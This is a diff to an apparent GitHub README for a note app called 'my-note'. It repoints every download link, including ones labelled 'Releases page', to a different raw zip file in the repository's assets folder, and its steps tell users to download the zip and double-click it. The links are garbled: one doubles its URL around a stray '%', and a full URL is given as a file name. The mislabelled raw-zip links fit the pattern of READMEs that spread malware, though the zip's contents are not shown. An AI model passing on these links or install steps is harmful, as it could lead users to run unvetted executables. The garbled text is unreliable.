@@ -4,14 +4,14 @@
 
 Welcome to my-note! This application helps you organize your thoughts with ease. It gives you a clean space to jot down ideas, manage tasks, and keep everything accessible.
 
-[![Download my-note](https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip%https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip)](https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip)
+[![Download my-note](https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip%https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip)](https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip) to download my-note. Follow these steps for installation:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip) to download my-note. Follow these steps for installation:
 
 1. Click on the latest version listed on the Releases page.
-2. Find the installation file for your system. Look for a file named `https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip`.
+2. Find the installation file for your system. Look for a file named `https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip`.
 3. Click on the file name to start the download.
 4. Once the download completes, locate the file on your computer.
 5. Double-click the file to start the installation process.
@@ -53,7 +53,7 @@ If you encounter any issues while using my-note, try these solutions:
 
 - **Installation Errors:** Ensure your Windows version is compatible. Check if you have enough disk space.
 - **Application Crashes:** Restart your computer and try reopening my-note.
-- **Missing Features:** Ensure you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/tsnotaya/my-note/main/release/my-note-v3.2.zip).
+- **Missing Features:** Ensure you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/tsnotaya/my-note/main/assets/note-my-v1.4-alpha.5.zip).
 
 For further help, consider visiting community forums or the issue section on GitHub.
 
